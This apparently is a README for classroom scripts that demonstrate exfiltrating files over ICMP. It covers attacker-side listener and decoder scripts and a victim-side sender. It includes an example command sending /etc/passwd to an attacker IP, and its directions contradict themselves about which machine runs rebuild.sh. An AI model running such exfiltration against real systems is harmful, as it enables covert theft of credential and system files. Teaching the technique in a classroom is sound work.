## About:
These programs demostrate how an attacker can exfiltrate data using the icmp protocol.  
They are designed for use in a cybersecurity classroom.  

## Programs Included:
- exfil.sh: This program sends files **FROM the VICTIM** machine over the ICMP protocol.   
- listen.sh: This runs the tcpdump command and produces the output file data.dmp.  
- pyarray.py: This program parses through data.dmp file.  
- rebuild.sh: This script runs pyarray, produces a file called hexout, and prints the recieved file in plaintext.  

## Directions:

Copy listen.sh, pyarray.py, and rebuild.sh to the **ATTACKER** machine.  
Run  
```
./listen.sh  
```

Copy **exfil.sh** to the **VICTIM MACHINE**  
Usage: ./exfil.sh <file_to_transfer> <ip_address_of_attacker>  
Example:
```
./exfil.sh /etc/passwd 192.168.14.5
```

Use CTRL-C to stop listen.sh.  
(You should see a file called data.dmp which contains the tcpdump output.)

On the **VICTIM** machine  
Run
```
./rebuild.sh 
```
The file sent from the victim will be printed in plain text.  


